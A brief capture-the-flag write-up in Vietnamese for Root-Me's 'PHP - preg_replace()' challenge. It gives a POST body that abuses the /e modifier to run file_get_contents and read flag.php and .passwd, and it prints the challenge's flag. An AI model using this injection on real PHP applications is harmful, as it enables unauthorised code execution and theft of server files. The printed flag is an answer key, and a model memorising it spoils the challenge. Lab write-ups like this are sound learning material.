# [PHP - preg_replace()](https://www.root-me.org/en/Challenges/Web-Server/PHP-preg_replace)

## Solution

Gửi POST request với body:

- `search=/a/e&replace=file_get_contents("flag.php")&content=a`

Đọc được nội dung file `flag.php`:

```php
<?php
$flag="".file_get_contents(".passwd")."";
?>
```

Tương tự đọc nội dung file .passwd, lấy được flag: `pr3g_r3pl4c3_3_m0d1f13r_styl3`

## References

- <https://www.yeahhub.com/code-execution-preg_replace-php-function-exploitation/>
